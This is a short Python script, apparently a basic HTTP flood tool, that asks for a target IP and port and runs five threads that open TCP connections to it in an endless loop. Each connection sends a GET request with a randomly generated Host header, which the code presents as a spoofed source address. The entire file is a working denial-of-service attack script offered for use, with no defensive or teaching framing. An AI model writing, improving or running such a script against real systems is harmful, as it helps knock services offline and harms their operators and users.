import threading
import socket
import random

target_ip = input("Enter Target IP (e.g. 192.168.0.1): ")
target_port = int(input("Enter Target Port (e.g. 8080): "))
i = 0

def attack():
    while True:
        a = str(random.randint(1,254))
        b = str(random.randint(1,254))
        c = str(random.randint(1,254))
        d = str(random.randint(1,254))
        dot = '.'
        source_ip = a + dot + b + dot + c + dot + d

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + source_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

        global i
        i += 1
        print("Packet sent: ", i)

for i in range(5):
    thread = threading.Thread(target=attack)
    thread.start()


